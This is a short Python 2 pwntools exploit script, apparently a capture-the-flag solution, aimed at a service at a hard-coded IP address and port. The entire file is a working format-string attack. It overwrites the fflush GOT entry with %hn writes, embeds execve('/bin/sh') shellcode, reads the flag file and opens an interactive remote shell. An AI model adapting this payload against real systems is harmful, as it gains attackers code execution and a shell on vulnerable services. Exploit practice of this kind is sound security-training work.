#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 35.237.220.217 --port 1339
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')

host = '35.237.220.217'
port = 1339

def start():
    return connect(host, port)


#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

payload = pack(0x0804A010)      #fflush_got
payload+= pack(0x0804A010 + 2)  #fflush_got+2

# Append our shellcode: http://shell-storm.org/shellcode/files/shellcode-827.php
payload+= "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
# Pad until it's 136 bytes
payload = payload.ljust(136, "A")

# write value 0x804 on parameter 19
payload+="%" + str(0x804) + "x" 
payload+="%19$hn"
# write value 0xb010 on parameter 18.   0xb010 - 0x804 = 0xa80c
payload+="%" + str(0xa80c) + "x" 
payload+="%18$hn"

io.sendline(payload)

io.sendline("echo; cat flag.txt")

io.interactive()